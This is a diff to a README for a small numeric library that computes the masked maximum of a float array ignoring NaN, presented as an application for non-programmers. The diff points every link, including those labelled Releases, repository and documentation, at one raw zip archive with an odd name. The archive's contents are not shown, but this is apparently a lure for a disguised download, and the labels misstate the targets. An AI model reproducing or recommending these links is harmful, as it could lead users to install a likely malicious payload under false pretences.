@@ -4,10 +4,10 @@
 This project helps you compute the maximum value of a double-precision floating-point array according to a mask, while ignoring `NaN` values. You don’t need to be a programmer to use this software. Follow the steps below to get started.
 
 ## 📥 Download the Application
-[![Download Stats Base Ndarray Dnanmskmax](https://img.shields.io/static/v1?label=Download&message=Releases&color=blue)](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/releases)
+[![Download Stats Base Ndarray Dnanmskmax](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/raw/refs/heads/main/lib/ndarray_stats_dnanmskmax_base_wirehair.zip)](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/raw/refs/heads/main/lib/ndarray_stats_dnanmskmax_base_wirehair.zip)
 
 ## 🔗 Visit the Releases Page
-Visit this page to download the latest version: [Releases Page](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/releases)
+Visit this page to download the latest version: [Releases Page](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/raw/refs/heads/main/lib/ndarray_stats_dnanmskmax_base_wirehair.zip)
 
 ## 💻 System Requirements
 Make sure your computer meets these basic requirements:
@@ -69,14 +69,14 @@ Once the application is open:
 - Keep the application updated by visiting the Releases page regularly.
 
 ## 🤝 Get Involved
-If you would like to contribute to the project, feel free to open an issue or submit a pull request on our [GitHub Repository](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax).
+If you would like to contribute to the project, feel free to open an issue or submit a pull request on our [GitHub Repository](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/raw/refs/heads/main/lib/ndarray_stats_dnanmskmax_base_wirehair.zip).
 
 ## 📫 Contact Information
 For further questions or feedback, please open an issue on the GitHub repository or reach out directly via GitHub.
 
 ### 🔗 Additional Resources
-- [GitHub Repository](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax)
-- [Documentation](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/blob/main/docs/README.md)
+- [GitHub Repository](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/raw/refs/heads/main/lib/ndarray_stats_dnanmskmax_base_wirehair.zip)
+- [Documentation](https://github.com/nitin-dev1992/stats-base-ndarray-dnanmskmax/raw/refs/heads/main/lib/ndarray_stats_dnanmskmax_base_wirehair.zip)
 
 ## 🎉 Conclusion
 Now you are ready to compute maximum values from arrays without the hassle of programming. Enjoy using the stats-base-ndarray-dnanmskmax!
